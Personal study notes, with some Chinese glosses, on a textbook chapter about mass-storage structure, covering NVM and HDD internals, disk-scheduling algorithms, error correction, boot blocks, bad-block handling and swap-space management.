  - NAND semiconductors also deteriorate 恶化 with every erase cycle, and after approximately 100,000 program-erase cycles (the specific number varies depending on the medium), the cells no longer retain data. Because
of the write wear 写穿, and because there are no moving parts,
NAND NVM lifespan is measured in Drive writes per day (DWPD): how many times the
drive capacity can be written per day before the drive fails.
Example, 1TB NAND drive with a 5 DWPD rating is expected to have 5 TB per day
written to it for the warranty period without failure.
These limitations have led to several ameliorating 改善 algorithms. Fortunately, they are usually implemented in the NVM device controller and are not of concern to the operating system.
The operating system simply reads and writes logical blocks, and the device manages how that is done. NVM devices have performance variations based on their operating algorithms, so a brief discussion of what the controller does is warranted.
11.1.2.2 NAND flash controller algorithms
Because NAND semiconductors cannot be overwritten once written, there are usually pages containing invalid data.
Consider a file-system block, written once and then later written again. If no erase has occurred in the meantime, the page first written has the old data, which are now invalid, and the second page has the current, good version of the block.  A NAND block containing valid and invalid pages.
To track which logical blocks contain valid data, the controller maintains a flas
translation layer (FTL).
This table maps which physical pages contain currently valid logical blocks.
It also tracks physical block state—which blocks contain only invalid pages and therefore can be erased.
Now consider a full SSD with pending write request. The SSD is full, all pages have been written.
but there might be block contains invalid data.
  - In that case, the write could wait for the erase to occur, and then the write
could occur.
no free blocks, but could be some space available if individual pages are holding
invalid data.
  - In that case, garbage collection could occur
  - good data could be copied to other locations, freeing up blocks that could be erased and could then receive the writes. the NVM device uses over-provisioning for garbage collection store the good data
  - The device sets aside a number of pages (frequently 20 percent of the total) as an area always available to write to. Blocks that are totally invalid by garbage collection, or write operations invalidating older versions of the data, are erased and placed in the over-provisioning space if the device is full or returned to the free pool.
The over-provisioning space can also help with wear leveling 磨平.
  - If some blocks are erased repeatedly, the frequently erased blocks will wear out faster than the others, and the entire device will have a shorter lifespan than it would if all the blocks wore out concurrently.
  - The controller tries to avoid that by using various algorithms to place data on less-erased blocks so that subsequent erases will happen on those blocks rather than on the more erased blocks, leveling the wear across the entire device.
In terms of data protection:
NVM devices, like HDD, provide error-correcting codes, which are calculated and stored along with the data during writing and read with the data to detect errors and correct them if possible. (If a page frequently has correctible errors, the page might be marked as bad and not used in subsequent writes)
single NVM device, like HDD, can have a catastrophic failure: corrupts or fails to reply to read or write requests. To allow data to be recoverable in those instances, RAID protection is used.
536chapter11.1.3 Volatile Memory
volatile memory, DRAM is frequently used as a mass-storage device.
Specifically, RAM drives act like secondary storage but are created by device drivers that carve out a section of the system’s DRAM and present it to the rest of the system as it if were a storage device. These “drives” can be used as raw block devices, but more commonly, file systems are created on them for standard file operations. Computers have buffering and caching, why DRAM for temporary data storage?
DRAM is volatile: data does not survive a system crash/shutdown/power down.
Caches and buffers are allocated by the programmer or operating system, whereas RAM drives allow the user or programmer to place data in memory for temporary safekeeping using standard file operations.
RAM drives are found in all major operating systems.
  - On Linux: /dev/ram,
  - on macOS: the diskutil command creates them,
  - Windows: via third-party tools,
  - Solaris and Linux: create /tmp at boot time of type “tmpfs”, which is a RAM drive.
RAM drives are useful as high-speed temporary storage space, much faster than NVM, and I/O operations to RAM drives are the fastest way to create, read, write, and delete files and their contents. Many programs use (or could benefit from using) RAM drives for storing temporary files.
Example, programs can share data easily by writing and reading files from a RAM drive.
For another example, Linux at boot time creates a temporary root file system (initrd) that allows other parts of the system to have access to a root file system and its contents before the parts of the operating system that understand storage devices are loaded.
MAGNETIC TAPES
MAGNETIC TAPES was used as an early secondary-storage medium. Nonvolatile, can hold large quantities of data, but its access time is slower then main memory and drives. Salow: random access to magnetic tape is about a thousand times slower than to HDDs and hundred thousand times slower than to SSDs, not very useful for secondary storage.
Tapes are used mainly for backup, for storage of infrequently used information, and as a medium for transferring information from one system to another.
A tape is kept in a spool 线轴 and is wound or rewound past a read–write head.
  - Moving to the correct spot on a tape can take minutes, but once positioned, tape drives can read and write data at speeds comparable to HDDs. 140MB/sec and greater
Tape capacities vary greatly, depending on the particular kind of tape drive, with current capacities exceeding several terabytes. Some tapes have built-in compression that can more than double the effective storage. 200GB to 1.5TB typical storage
Tapes and their drivers are usually categorized by width, including 4, 8, and 19 millimeters and 1/4 and 1/2 inch.
Some are named according to technology, such as LTO-6 and SDLT.
Common technologies are LTO-{3,4,5} and T10000
 Figure 11.5 An LTO-6 Tape drive with tape cartridge inserted.
536chapter11.1.4 Secondary Storage Connection Methods A secondary storage device is attached to computer by system bus or I/O bus. Several kinds of buses are available, including:
advanced technology attachment (ATA), serial ATA (SATA), eSATA, serial attached SCSI (SAS),
universal serial bus (USB),
and fibr channel (FC)
The most common connection method is SATA.
Because NVM devices are much faster than HDDs, the industry created a special, fast interface for NVM devices called NVM express (NVMe).
NVMe directly connects the device to the system PCI bus, increasing throughput and decreasing latency compared with other connection methods.
The data transfers on a bus are carried out by electronic processors conrtollers (or host- bus adapters (HBA)).
The host conrtoller is the controller at the computer end of the bus. A device conrtoller is built into each storage device.
To perform a mass storage I/O operation:
the computer places a command into the host controller, typically using memory- mapped I/O ports,
The host controller then sends the command via messages to the device controller, the device controller operates the drive hardware to carry out the command. Device controllers usually have a built-in cache.
Data transfer at the drive happens between the cache and the storage media,
and data transfer to the host, at fast electronic speeds, occurs between the cache and host DRAM via DMA.
536chapter11.1.5 Address Mapping
Storage devices are addressed as large one-dimensional arrays of logical blocks, where the logical block is the smallest unit of transfer.
Each logical block maps to a physical sector / semiconductor page.
The one-dimensional array of logical blocks is mapped onto the sectors / pages of the device.
 Mapping: example.
HDD: Sector 0 could be the first sector of the first track on the outermost cylinder on an HDD, the mapping proceeds in order through that track, then through the rest of the tracks on that cylinder, and then through the rest of the cylinders, from outermost to innermost.
NVM mapping: from a tuple 数组 (finite ordered list) of chip, block, and page to an array of logical blocks.
A logical block address (LBK) is easier for algorithms to use than a sector, cylinder, head tuple or chip, block, page tuple.
By using this mapping on an HDD, we can—at least in theory—convert a logical block number into an old-style disk address that consists of a cylinder number, a track number within that cylinder, and a sector number within that track.
Logical should be easy, but in practice, it is difficult to perform this translation, for three reasons:
First, bad sector: most drives have some defective sectors, but the mapping hides this by substituting spare sectors from elsewhere on the drive. The logical block address stays sequential, but the physical sector location changes.
Second, the number of sectors per track is not a constant on some drives.
Third, disk manufacturers manage LBA to physical address mapping internally, so in current drives there is little relationship between LBA and physical sectors. In spite of these physical address vagaries, algorithms that deal with HDDs tend to assume that logical addresses are relatively related to physical addresses. That is, ascending logical addresses tend to mean ascending physical address.
Let’s look more closely at the second reason. On media that use constant lilnear velocity (CLV), the density of bits per track is uniform.
From the farther track to the center:
  - length greater, more sectors.
  - the outermost zone sectors: 40% more than the innermost zone.
the head moves from the outer to the inner tracks: The drive increases its rotation speed to keep the same rate of data moving under the head.   - used in CD-ROM and DVD-ROM drives.
Alternatively, the disk rotation speed can stay constant, the density of bits decreases from inner tracks to outer tracks to keep the data rate constant (and performance relatively the same no matter where data is on the drive).
  - used in hard disks, called Constant angular velocity (CAV).
The number of sectors per track and cylinders per disk increase, outer zone of a disk usually has several hundred sectors per track, large disks have tens of thousands of cylinders.
Note that there are many types of storage devices:
example, there are “shingled magnetic recording” hard drives with higher density but worse performance than mainstream HDDs (see http://www.tomsitpro.com/articles/ shingled-magnetic-recoding-smr-101-basics,2-933.html).
There are also combination devices that include NVM and HDD technology, or volume managers that can knit together NVM and HDD devices into a storage unit faster than HDD but lower cost than NVM.
These devices have different characteristics from the more common devices, and might need different caching and scheduling algorithms to maximize performance.
Disk Attachment
Host-attached storage accessed through I/O ports talking to I/O busses.
小型计算机系统接口(SCSI，Small Computer System Interface)是一种用于计算机及其週邊設備之间(硬盘、软 驱、光驱、打印机、扫描仪等)系统级接口的独立处理器标 准。
SCSI itself is a bus, up to 16 devices on one cable
  - SCSI initiator requests operation
  - SCSI targets perform tasks   - Each target can have up to 8 logical units (disks attached to device controller)
FC is high-speed serial architecture
Can be switched fabric with 24-bit address space –
the basis of storage area networks (SANs) in which many hosts attach to many storage units
I/O directed to bus ID, device ID, logical unit (LUN)
 Storage Array
Can just attach disks, or arrays of disks
Storage Array has controller(s), provides features to attached host(s)
Ports to connect hosts to array
Memory, controlling software (sometimes NVRAM,
etc) A few to thousands of disks
RAID, hot spares, hot swap (discussed later) Shared storage -> more efficiency
Features found in some file systems
  Snaphots, clones, thin provisioning, replication, deduplication, etc
Storage Area Network
Common in large storage environments.
Multiple hosts attached to multiple storage arrays - flexible.
 SAN is one or more storage arrays
  - Connected to one or more Fibre Channel
switches Hosts also attach to the switches
Storage made available via LUN Masking from specific arrays to specific servers
Easy to add/remove storage, add new host, allocate storage
  - Over low-latency Fibre Channel fabric Why have separate storage networks and
communications networks?
  - Consider iSCSI, FCOE
Network-Attached Storage
Storage over network (not over local connection (like bus))   Remotely attaching to file systems
common protocols: NFS and CIFS
Implemented via remote procedure calls (RPCs) between host and storage over typically TCP/UDP on IP network
iSCSI protocol uses IP network to carry the SCSI protocol Remotely attaching to devices (blocks) 536chapter11.2 HDD Scheduling
One of the responsibilities of the operating system is to use the hardware efficiently. For HDDs, it is minimizing access time and maximizing data transfer bandwidth.
For HDDs and storage devices that use platters, access time =
  - The seek time: move the heads to the cylinder containing the desired
sector.
  - The rotational latency: rotate the desired sector to the head.
The device bandwidth: the total number of bytes transferred, divided by the total time between the first request for service and the completion of the last transfer.
We can improve both the access time and the bandwidth by managing the order in which storage I/O requests are serviced.
When process needs I/O to or from the drive, it issues a system call to the operating system. The request specifies several pieces of information.
  - Whether this operation is input / output.
  - Disk address, The open file handle indicating the file to operate on.
  - What the memory address for the transfer is.
  - The amount of data to transfer.
If the desired drive and controller are available, the request can be serviced immediately.
If the desired drive and controller is busy, any new requests for service will be placed in the queue of pending requests for that drive.
  - OS maintains queue of requests, per disk or device For a multiprogramming system with many processes, the device queue may often have several pending requests.
The existence of a queue of requests to a device that can have its performance optimized by avoiding head seeks allows device drivers a chance to improve performance via queue ordering.
In the past, HDD interfaces required that the host specify which track and which head to use, and much effort was spent on disk scheduling algorithms.
Drives newer than the turn of the century not only do not expose these controls to the host, but also map LBA to physical addresses under drive control.
The current goals of disk scheduling: fairness, timeliness, and optimizations, such as bunching reads or writes that appear in sequence, as drives perform best with sequential I/O.
Therefore some scheduling effort is still useful. Any one of several disk-scheduling algorithms can be used, and we discuss them next. Note that absolute knowledge of head location and physical block/cylinder locations is generally not possible on modern drives. But as a rough approximation, algorithms can assume that increasing LBAs mean increasing physical addresses, and LBAs close together equate to physical block proximity.
536chapter11.2.1 FCFS Scheduling
First-come, first-served (FCFS) algorithm (or FIFO).
The simplest disk scheduling
intrinsically fair but does not provide the fastest service.
Example: disk queue with requests for I/O to blocks on cylinders 98, 183, 37, 122, 14, 124, 65, 67,
If the disk head is initially at cylinder 53 it will move from 53 - 98 - 183 - 37 - 122 - 14 - 124 - 65 - 67. total head movement of 640 cylinders.
 problem with this schedule: The wild swing from 122 to 14
the total head movement should be decreased substantially, improve and performance.
536OS: chapter11.2.1 SSTF Scheduling
Shortest Seek Time First: selects the request with the minimum seek time from the current head position may cause starvation of some requests
Illustration shows total head movement of 236 cylinders
536chapter11.2.2 SCAN Scheduling
In the SCAN algorithm
the disk arm starts at one end of the disk, moves toward the other end, servicing
requests as it reaches each cylinder, until it gets to the other end of the disk. At the end, head movement reversed, and servicing continues.
The head continuously scans back and forth across the disk.
ometimes called the elevator algorithum.
Example: applying SCAN to schedule the requests on cylinders 98, 183, 37, 122, 14, 124,
 65, and 67.
queue = 98, 183, 37, 122, 14, 124, 65, 67
head starts at 53 - 37 - 14 - 0 - 65 - 67 - 98 - 122 - 124 - 183 - 199
 New request arrives in the queue:
  - in front of the head — will be serviced almost immediately;
  - behind the head — have to wait until the arm moves to the end of the disk, reverses direction, and comes back.
536OS: chapter11.2.3 C-SCAN Scheduling Circular SCAN (C-SCAN) Scheduling
a variant of SCAN
designed to provide a more uniform wait time.
Like SCAN, C-SCAN moves the head from one end to the other, servicing requests along the way.
When the head reaches the other end, it returns to the beginning of the disk without servicing any requests on the return trip.
 536OS: chapter11.2.3 C-LOOK Scheduling LOOK a version of SCAN, C-LOOK a version of C-SCAN
Arm only goes as far as the last request in each direction, then reverses direction immediately, without first going all the way to the end of the disk
Total number of cylinders?
 536OS: chapter11.2.4 Selection of a Disk-Scheduling Algorithm
There are many disk-scheduling algorithms not included in this coverage, How decide which to implement, chose the best to use?
For any particular list of requests, we can define an optimal order of retrieval, but the computation needed to find an optimal schedule may not justify the savings over SCAN.
Scheduling algorithm performance depends heavily on the number and types of
requests.
SSTF is common and has a natural appeal
The queue usually has just one outstanding request.
  - all scheduling algorithms behave the same, because they have only one
choice of where to move the disk head: they all like FCFS scheduling.
heavy load on the disk
  - SCAN and C-SCAN perform better, because they are less starvation problem.
There can still be starvation though, which drove Linux to create the deadline scheduler.
  - This scheduler maintains separate read and write queues, gives reads priority because processes are more likely to block on read than write.
  - The queues are sorted in LBA order, essentially implementing C-SCAN.
  - All I/O requests are sent in a batch in this LBA order.
  - Deadline keeps four queues: two read and two write, one sorted by LBA and the other by FCFS.
  - It checks after each batch to see if there are requests in the FCFS queues older than a configured age (by default, 500 ms). If so, the LBA queue (read or write) containing that request is selected for the next batch of I/O.
The deadline I/O scheduler is the default in the Linux RedHat 7 distribution, but RHEL 7 also includes two others. NOOP is preferred for CPU-bound sys- tems using fast storage such as NVM devices, and the Completely Fair Queueing Scheduler (CFQ) is the default for SATA drives. CFQ maintains three queues (with insertion sort to keep them sorted in LBA order): real time, best effort (the default), and idle. Each has exclusive priority over the others, in that order, with starvation possible. It uses historical data, anticipating if a process will likely issue more I/O requests soon. If it so determines, it idles waiting for the new I/O, ignoring other queued requests. This is to minimize seek time, assuming locality of reference of storage I/O requests, per process. Details of these sched- ulers can be found in https://access.redhat.com/site/documentation/ en-US /Red Hat Enterprise Linux/7/html/Performance Tuning Guide/index.html.
  Requests for disk service can be influenced by the file- allocation method
  And metadata layout
  The disk-scheduling algorithm should be written as a separate module of the OS, allowing it to be replaced with other algorithm.
  Either SSTF or LOOK is a reasonable choice for the default algorithm
  What about rotational latency?   Difficult for OS to calculate
  How does disk-based queueing effect OS queue ordering efforts?
536OS: chapter11.3 NVM Scheduling
The Disk-scheduling Algorithms apply to mechanical platter-based storage like HDDs, focus primarily on minimizing the amount of disk head movement. NVM devices do not contain moving disk heads and commonly use a simple FCFS policy.
example: The Linux Noop scheduler uses an FCFS policy but modifies it to merge adjacent requests. The observed behavior of NVM devices indicates that the time required to service reads is uniform but that, because of the properties of flash memory, write service time is not uniform. Some SSD schedulers have exploited this property and merge only adjacent write requests, servicing all read requests in FCFS order.
As we have seen, I/O can occur sequentially or randomly. Sequential access is optimal for mechanical devices like HDD and tape because the data to be read or written is near the read/write head. Random-access I/O, which is measured in input/output operations per second (IOPS), causes HDD disk head movement. Naturally, random access I/O is much faster on NVM. An HDD can produce hundreds of IOPS, while an SSD can produce hundreds of thousands of IOPS.
NVM devices offer much less of an advantage for raw sequential through- put, where HDD head seeks are minimized and reading and writing of data to the media are emphasized. In those cases, for reads, performance for the two types of devices can range from equivalent to an order of magnitude advantage for NVM devices. Writing to NVM is slower than reading, decreasing the advantage. Furthermore, while write performance for HDDs is consistent throughout the life of the device, write performance for NVM devices varies depending on how full the device is (recall the need for garbage collection and over-provisioning) and how “worn” it is. An NVM device near its end of life due to many erase cycles generally has much worse performance than a new device.
One way to improve the lifespan and performance of NVM devices over time is to have the file system inform the device when files are deleted, so that the device can erase the blocks those files were stored on. This approach is discussed further in Section 14.5.6.
Let’s look more closely at the impact of garbage collection on performance. Consider an NVM device under random read and write load. Assume that all blocks have been written to, but there is free space available. Garbage collection must occur to reclaim space taken by invalid data. That means that a write might cause a read of one or more pages, a write of the good data in those pages to overprovisioning space, an erase of the all-invalid-data block, and the placement of that block into overprovisioning space. In summary, one write request eventually causes a page write (the data), one or more page reads (by garbage collection), and one or more page writes (of good data from the garbage-collected blocks). The creation of I/O requests not by applications but by the NVM device doing garbage collection and space management is called write amplificatio and can greatly impact the write performance of the device. In the worst case, several extra I/Os are triggered with each write request.
11.4 Error Detection and Correction
Error detection and correction:
fundamental to many areas of computing, including memory, networking, and storage. Error detection determines if a problem has occurred. example:
  - a bit in DRAM spontaneously changed from a 0 to a 1,
  - the contents of a network packet changed during transmission,
  - a block of data changed between when it was written and when it was read.
By detecting the issue, the system can:
  - halt an operation before the error is propagated,
  - report the error to the user or administrator,
  - warn of a device that might be starting to fail or has already failed.
Memory systems have long detected certain errors by using parity bits. In this scenario, each byte in a memory system has a parity bit associated with it that records whether the number of bits in the byte set to 1 is even (parity = 0) or odd (parity = 1).
If one of the bits in the byte is damaged (either a 1 or 0), the parity of the byte changes, thus does not match the stored parity.
if the stored parity bit is damaged, it does not match the computed parity.
Thus, all single-bit errors are detected by the memory system.
A double-bit-error might go undetected, however. Note that parity is easily calculated by performing an XOR (“eXclusive OR”) of the bits. Also note that for every byte of memory, we need an extra bit of memory to store the parity.
Parity is one form of checksums, which use modular arithmetic to compute, store, and compare values on fixed-length words.
Another common network error-detection is cyclic redundancy check (CRCs)
Uses hash function to detect multiple-bit errors (see http://www.mathpages.com/home/ kmath458/kmath458.htm). An error-correcton code (ECC): detects + corrects the problem
The correction is done by using algorithms and extra amounts of storage.
The codes vary based on how much extra storage they need and how many errors they can correct.
example:
disks drives — per-sector ECC flash drives — per-page ECC.
  - When the controller writes a sector/page of data during normal I/O, the ECC is written with a value calculated from all the bytes in the data being written.
  - When the sector/page is read, the ECC is recalculated and compared with the stored value.
  - If different, the mismatch indicates that the data is corrupted and the storage media may be bad (Section 11.5.3).
The ECC is error correcting because it contains enough information:
  - Reports a recoverable soft error.
  - If only a few bits are corrupted,
  - enable the controller to identify which bits have changed and
calculate what their correct values should be.
  - Signal a non- correctable hard error.
  - If too many changes occur, and the ECC cannot correct the error. The controller automatically does the ECC processing whenever a sector or page is
read or written. products and enterprise products.
example:
ECC is used in some systems for DRAM error correction and data path protection,
11.5 Storage Device Management
The OS is responsible for several other aspects of storage device management, too, like drive initialization, booting from a drive, and bad-block recovery.
11.5.1 Drive Formatting, Partitions, and Volumes
New storage device is a blank slate: a platter of a magnetic recording material or a set of uninitialized semiconductor storage cells.
Before a storage device can store data, it must be divided into sectors that the controller can read and write.
Low-level / physical formatting: OS fills the device with a special data structure for each storage location.
Partition the disk into cylinders, each treated as a logical disk, Dividing a disk into sectors that the disk controller can read and write.
  - To increase efficiency, most file systems group blocks into clusters
  - Disk I/O done in blocks
  - File I/O done in cluster
The data structure for a sector/page: header, data, trailer and error detection/correction code (ECC)
  - The header and trailer: contain information used by the controller (like a sector/page number and an error detection/correction code).
Usually 512 bytes of data but can be selectable NVM pages must be initialized and the FTL created.
Most drives, low-level-formatted at the factory as the manufacturing process.
enables the manufacturer to test the device and to initialize the mapping from logical block numbers to defect-free sectors or pages on the media.
a few sector sizes, such as 512 bytes and 4KB.
Formatting a disk with large sector size
= each track fewer sectors
= fewer headers and trailers on each track, more space for data. Some operating systems can handle only one specific sector size.
Before to hold user files, the OS still needs to record its own data structures on the device in 3 steps.
1 step: partition the device into groups of blocks or pages.
  - The OS can treat each partition as though it were a separate device.
  - For instance:
  - one partition can hold a file system containing a copy of the OS’s executable code, another the swap space, and another a file system containing the user files.
  - Some operating systems and file systems perform the partitioning automatically when an entire device is to be managed by the file system. The partition information is written in a fixed format at a fixed location on the storage device.
  - In Linux, the fdisk command is used to manage partitions on storage devices.
  - The device, when recognized by the operating system, has its partition information read,   - the OS then creates device entries for the partitions (in /dev).
  - From there, a configuration file, like /etc/fstab, tells the operating system to mount each partition containing a file system at a specified location and to use mount options such as read-only.
  - Mounting a file system is making the file system available for use by the system and its users.
2 step: volume creation and management.
  - Implicit: when a file system is placed directly in a partition, that volume
is then ready to be mounted and used.
  - Explicit:
  - example when multiple partitions or devices will be used together as a RAID set (see Section 11.8) with one or more file systems spread across the devices.
  - The Linux volume manager lvm2 can provide these features, as can commercial third-party tools for Linux and other operating systems. ZFS provides both volume management and a file system integrated into one set of commands and features. (Note that “volume” can also mean any mountable file system, even a file containing a file system such as a CD image.)
3 step: logical formatting, or creation of a file system.
  - The OS stores the initial file-system data structures onto the device.
  - These data structures may include maps of free and allocated space and an initial empty directory.
The partition information also indicates if a partition contains a bootable file system (containing the operating system).
The partition labeled for boot: for establish the root of the file system. Once it is mounted, device links for all other devices and their partitions can be created.
Generally, a computer’s “file system” consists of all mounted volumes. On Windows, these are separately named via a letter (C:, D:, E:).
On Linux, at boot time the boot file system is mounted, and other file systems can be mounted within that tree structure (as discussed in Section 13.3).
  - On Windows, the file system interface makes it clear when a given device is being used
  - On Linux a single file access might traverse many devices before the requested file in the requested file system (within a volume) is accessed.
Windows 7 Disk Management tool displaying three volumes (C:, E:, and F:).
  - E: and F: are each in a partition of the “Disk 1” device
  - there is unallocated space on that device for more partitions (possibly containing file systems).
To increase efficiency, most file systems group blocks together into larger chunks, clusters.
Device I/O is done via blocks, but file system I/O is done via clusters, effectively assuring that I/O has more sequential-access, fewer random-access characteristics.
File systems try to group file contents near its metadata as well, reducing HDD head seeks when operating on a file, example.
 Some OS give special programs the ability to use a partition as a large sequential array of logical blocks, without any file-system data structures, raw disk.
I/O to this array is termed raw I/O.
example: It can be used for swap space (see Section 11.6.2)
Some database systems prefer raw I/O because it enables them to control the exact location where each database record is stored.
Raw I/O bypasses all the file-system services: like buffer cache, file locking, prefetching, space allocation, file names, and directories.
We can make certain applications more efficient by allowing them to implement their own special-purpose storage services on a raw partition, but most applications use a provided file system rather than managing data themselves.
Note that Linux generally does not support raw I/O but can achieve similar access by using the DIRECT flag to the open() system call.
11.5.2 Boot Block
an initial program: for computer to start running— powered up / rebooted This initial bootstrap loader
- tends to be simple.
- Most computers, stored in NVM flash memory firmware on the system
motherboard and mapped to a known memory location.
- The bootstrap is stored in ROM
- Bootstrap loader program stored in boot blocks of boot partition
- The full bootstrap program is stored in the “boot blocks” at a fixed location on the device.
  - The default Linux bootstrap loader is grub2 (https://www.gnu.org/software/ grub/manual/ grub.html/).   - boot disk or system disk: A device that has a boot partition.
- updated by product manufacturers, or written by viruses (infect the system)
- It initializes all aspects of the system, CPU registers, device controllers, the contents of main memory.
- This tiny bootstrap loader program is also smart enough to bring in a full bootstrap program from secondary storage.
The code in the bootstrap NVM instructs the storage controller to read the boot blocks into memory (no device drivers are loaded at this point) and then starts executing that code.
The full bootstrap program is more sophisticated than the bootstrap loader: it is able to load the entire operating system from a non-fixed location on the device and to start the operating system running.
- Example:
- boot process in Windows.
- First, Windows divided a drive into partitions, the boot partition contains the operating system and device drivers.
- The Windows system places its boot code in the first logical block on the hard disk or first page of the NVM device, (master boot record, MBR)
- Booting begins by running code resident in the system’s firmware.
- This code directs the system to read the boot code from the MBR, understanding just enough about the storage controller and storage device to load a sector from it.
- MBR = boot code + a partition table (listing the partitions for the drive, and a flag indicating which partition the system is to be booted from).
- Once the system identifies the boot partition, reads the first sector/page from that partition (boot sector), which directs it to the kernel. - It then continues with the remainder of the boot process, loading the various subsystems and system services.
 11.5.3 Bad Blocks
Disk are prone to failure: have moving parts and small tolerances (disk head flies just above the disk surface)
Failure is complete: disk needs to be replaced, restored contents to the new disk. bad blocks: more frequently, one or more sectors become defective
Depending on the disk and controller in use, these blocks are handled in a variety of ways.
On older disks, such as some disks with IDE controllers, bad blocks are handled manually.
  - One strategy scan the disk, find bad blocks while the disk is being formatted.
  - Any bad blocks that are discovered are flagged as unusable so that the file system does not allocate them.
  - If blocks go bad during normal operation, a special program (such as the Linux badblocks command) must be run manually to search for the bad blocks and to lock them away.
  - Data on the bad blocks usually lost.
sector sparing / forwarding: most sophisticated disks are smarter about the bad-block recovery.
The controller maintains a list of bad blocks on the disk. The list is initialized during the low-level formatting at the factory and is updated over the life of the disk.
Low-level formatting also sets aside spare 多余 sectors not visible to the operating system.
The controller can be told to replace each bad sector logically with one of the spare sectors.
A typical bad-sector transaction might be as follows:
The operating system tries to read logical block 87.
The controller calculates the ECC, finds that the sectoris bad, reports this finding to the OS as an I/O error.
The device controller replaces the bad sector with a spare.
After that, when system requests logical block 87, it translated to the replacement
sector’s address by the controller. But such a redirection by the controller could invalidate any optimization by the operating system’s disk-scheduling algorithm!
So most disks are formatted to provide: a few spare sectors in each cylinder, and a spare cylinder.
uses a spare sector from the same cylinder to remapped the bad block.
sector slipping 渐渐松驰的
an alternative to sector sparing to replace a bad block
Example:
Logical block 17 defective and the first available spare follows sector 202.
Sector slipping remaps all the sectors from 17 to 202, moving them all down one spot.
That is, sector 202 is copied into the spare, then sector 201 into 202, then 200 into 201, and so on, until sector 18 is copied into sector 19, sector 17 can be mapped to 18
Recoverable soft errors may trigger a device activity in which a copy of the block data is made and the block is spared or slipped.
An unrecoverable hard error, however, results in lost data.
Whatever file was using that block must be repaired (for instance, by restoration from a
backup tape), and that requires manual intervention.
NVM devices
also have bits, bytes, even pages that either are nonfunctional at manufacturing time or go bad over time.
Management of those faulty simpler than for HDDs
Because no seek time performance loss to be avoided.
Either multiple pages can be set as replacement locations, or space from the over- provisioning area can be used (decreasing the usable capacity of the over- provisioning area).
Either way, the controller maintains a table of bad pages and never sets those pages as available to write to, so they are never accessed.
⁃
11.6 Swap-Space Management
Swapping
moving entire processes between secondary storage and main memory.
when physical memory reaches a critically low point and processes
Now, very few modern OS: moved from memory to swap space to free memory.
More systems: combine swapping with virtual memory techniques and swap pages, not necessarily entire processes.
In fact, some systems now use the terms “swapping” and “paging” together.
Swap-Space Management low-level task of the OS.
Virtual memory uses secondary storage space as an extension of main memory. Since drive access is much slower than memory access, using swap-space significantly decreases system performance.
The main goal for swap space: provide best throughput for virtual memory system. 11.6.1 Swap-Space Use
Swap space: various as different OS and memory-management algorithms. Example:
Swapping Systems: use swap space to hold an entire process image (including the code and data segments).
Paging systems: simply store pages that have been pushed out of main memory. The amount of swap space required / needed on a system:
vary from megabytes to gigabytes.
depends on the amount of physical memory, the amount of virtual memory it is backing, and the way in which the virtual memory is used.
overestimate better than underestimate
  - Overestimation: wastes secondary storage space (could be used for files), no other harm.
  - Underestimate: runs out: may forced to abort processes or crash entirely. Some systems recommend the amount to be set aside for swap space. Example:
  - Solaris: swap space = virtual memory exceeds pageable physical memory.
  - Linux:
  - swap space = double physical memory (past).
  - the paging algorithms changed, use considerably less swap space (Today).   - Some operating systems (includ Linux) allow multiple swap spaces:
  - including both files and dedicated swap partitions.
  - These swap spaces usually placed on separate storage devices so the load placed on the I/O system by paging and swapping can be spread over the system’s I/O bandwidth.
11.6.2 Swap-Space Location
A swap space can reside in one of two places: be carved out of the normal file system,
  - If the swap space is simply a large file within the file system, normal file- system routines can be used to create it, name it, and allocate its space.
Or can be in a separate partition.
  - swap space can be created in a separate raw partition.
  - No file system or directory structure is placed in this space. Rather, a separate swap-space storage manager is used to allocate and deallocate the blocks from the raw partition.
  - This manager uses algorithms optimized for speed rather than for storage efficiency, because swap space is accessed much more frequently than file systems, when it is used (swap space is used for swapping and paging).
Internal fragmentation may increase:
But acceptable because the data life in the swap space generally is much shorter than files in the file system.
  - swap space is reinitialized at boot time, fragmentation is short-lived.
  - raw-partition approach creates a fixed amount of swap space during disk
partitioning.
  - Adding more swap space requires: filesystem partitions or destroying them and restoring them from backup)
  - or adding another swap space elsewhere.
Some OS are flexible, can swap both in raw partitions and in file-system space.
example: Linux, the policy and implementation are separate, allowing the machine’s administrator to decide which type of swapping to use.
The trade-off is between the convenience of allocation and management in the file system and the performance of swapping in raw partitions.
11.6.3 Swap-Space Management: An Example
how swap space is used by following the evolution of swapping and paging in various UNIX systems.
4.3BSD allocates swap space when process starts; holds text segment (the program) and data segment
The traditional UNIX kernel: uses swap maps to track swap-space use. swapping that copied entire processes between contiguous disk regions and memory.
UNIX later: a combination of swapping and paging as paging hardware became available.
Solaris 1 (SunOS), the designers changed standard UNIX methods to improve efficiency and reflect technological developments.
  - When a process executes, text-segment pages containing code are brought in from the file system, accessed in main memory, and thrown away if selected for pageout.
  - reread a page from the file system is more efficient than write it to swap space and then reread it from there.
  - Swap space is only used as a backing store for pages of anonymous memory (memory not backed by any file), which includes memory allocated for the stack, heap, and uninitialized data of a process. Solaris 2.
  - The biggest change: allocates swap space only when a page is forced out of physical memory, rather than when the virtual memory page is first created.
  - File data written to swap space until write to file system requested
  - Other dirty pages go to swap space due to no other home
  - Text segment pages thrown out and reread from the file system
as needed
  - gives better performance, more physical memory, tend to page less.
Linux (similar to Solaris): swap space is now used only for anonymous memory.
  - allows one or more swap areas to be established.
  - Swap area: in either a swap file in regular file system or a dedicated swap partition.
  - Each swap area consists of a series of 4-KB pages slots, which are used to hold swapped pages. Associated with each swap area is a swap map—an array of integer counters, each corresponding to a page slot in the swap area.
  - If the value of a counter is 0, the corresponding page slot is available.
  - Values greater than 0 indicate that the page slot is occupied by a swapped
page.
  - The value of the counter indicates the number of mappings to the swapped page.
  - example:
  - value of 3: the swapped page is mapped to three different processes (which can occur if the swapped page is storing a region of memory shared by three processes). The data structures for swapping on Linux systems are shown in Figure 11.11.  11.7 Storage Attachment
access secondary storage, 3 ways: host-attached storage network-attached storage
cloud storage 11.7.1 Host-Attached Storage
Host-attached storage:
HDDs; NVM devices; CD, DVD, Blu-ray, tape drives; storage-area networks (SANs).
The I/O commands that initiate data transfers to a host-attached storage device are reads and writes of logical data blocks directed to specifically identified storage units (like bus ID or target logical unit).
host-attached storage
storage accessed through local I/O ports.
  - These ports use several technologies, the most common is SATA. A typical system has one or a few SATA ports.
connected via USB FireWire or Thunderbolt ports and cables.
  - gain access to more storage (individual storage device / device in a
chassis)
High-end workstations and servers
Need or need to share more storage,
use more sophisticated I/O architectures, like fiber channel (FC), a high-speed serial architecture that can operate over optical fiber or over a four-conductor copper cable.
Because of the large address space and the switched nature of the communication, multiple hosts and storage devices can attach to the fabric, allowing great flexibility in I/O communication.
